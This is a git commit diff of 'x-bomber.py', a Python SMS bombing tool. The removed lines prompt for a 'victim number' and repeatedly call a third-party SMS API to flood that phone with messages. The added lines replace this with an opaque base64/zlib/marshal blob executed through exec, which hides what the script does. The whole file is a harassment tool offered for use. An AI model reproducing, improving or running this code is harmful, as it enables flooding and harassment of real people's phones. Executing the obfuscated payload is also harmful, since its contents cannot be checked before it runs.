26268d8d2258c5f9b1a6e77798f593f3ea5f629c
Siam Hossen <106375641+siamvau69@users.noreply.github.com>
2022-12-29 09:30:12 +0600

    x-bomber.py

--- x-bomber.py
+++ x-bomber.py
@@ -1,35 +1,3 @@
-import os
-import requests
-
-os.system ('clear')
-
-logo = '''
-\033[1;92m
-
-╭━╮╭━╮╭━━╮╭━━━┳━╮╭━┳━━╮
-╰╮╰╯╭╯┃╭╮┃┃╭━╮┃┃╰╯┃┃╭╮┃
-╱╰╮╭╯╱┃╰╯╰┫┃╱┃┃╭╮╭╮┃╰╯╰╮
-\033[1;31m╱╭╯╰╮╱┃╭━╮┃┃╱┃┃┃┃┃┃┃╭━╮┃
-╭╯╭╮╰╮┃╰━╯┃╰━╯┃┃┃┃┃┃╰━╯┃
-╰━╯╰━╯╰━━━┻━━━┻╯╰╯╰┻━━━╯
-\033[1;92m=================================
-\033[1;32m= Author   : SIAM HOSSEN        =
-\033[1;32m= TOOL     : SMS BOMBING        =
-\033[1;31m= VERSION  : 1.0                =
-\033[1;31m= FACEBOOK : M4F1A.BOY.S14M.OK3 =
-\033[1;31m=================================
-'''
-
-def ___bomb___():
-  user=[]
-os.system('clear')
-print(logo)
-n = input("Enter Your Victim Number: ")
-a = int(input ("Enter Your SMS Amount: "))
-print('PROCESS RUNNING....')
-for i in range (a):
-	r= requests.get("http://deepitsolution.in/api.php?number="+n)
-	f= r.content
-	print(f)
-	print(' PROCESS COMPLETED....')
-exit()
+#ENCRYPT BY SIAM HOSSEN
+import marshal,zlib,base64
+exec(marshal.loads(zlib.decompress(base64.b64decode("eJyFVEtP20AQHickJG6gD6QitVK1xxwq0xQuTUvbJISHIDaKKYhUFQrxNhjFdrDXFT30UNGfAL+i4iUOPfTf8EfamY0dEl+Y7M7O49vZmUkmHYhoAvdH3ME1MguXAj2A1lBWoKUABzhMgZWCEwUUKw2tNFgT8AtxE+M+noaVVZ4BK0NqKwt8EkjNkkqWHFiTCDkuA88Dz5Ft6ctLaKnAFTh8AFYOeBZmCVoAXoDDKWhNA5/GO1Ye2dE32OEP4QQwDwXMoopZ2/+QdJFBsdPjbT/4kwJQn38uvX3z2lHV27Pz29Oft2cXSSEh07oZN94MYRjlSjqQX5Ib+emJFC5IGMiDy5F6FWFGYBjlOg4kQ6A6hCI//S3V67FrwzeGMEyHqpsvOTLe+dAcx0tkEsdLrBGYGkc5j4uMXyTEZVJOBrpzqXdKQojW3zE5SnyAGXGdXcbf3+J9NGgFAlklFAeezxgrM3Ot0mCrhmnWdRbRCHDLMDakDYENk1WNRnVNX0kASwjcrjfNNUMnYEl7xRI0Alyu1OpVw1hHYGNhuVTRqsauZpYWGpqxPj8CvLeYDs2kEu0azSX9wrsAP+REmkWy60VCSVHQ/IYB9wcmYkGKJrkr6OLe3t6+5+zjMRt7QAmeIa+7gvts1wt9tm13hO0wPXT2uV9mwey4m1pUcbzQFeibQd9m06jVTZM1P+k69k1DCujlAyH65bk5i/O+LQKvFwrbczXbnWv3ba1/0P/gyhcWg6cIZnGUmtHY3Khv1ZcoTvER1URpeoHI4eHzo5AHIhBZyv97ILgjS+55Xa9JODn2ttsPhaB+uCIt9YHWll6/7Xa51G3pRUVqvpikvwwPS43wX2VsfmyLu3aO9ZRSeud4Vtjj7+lC8AJZQSmkph5nU/nUlJJRCsoT5DP4yeOZV/4DFOjktQ=="))))
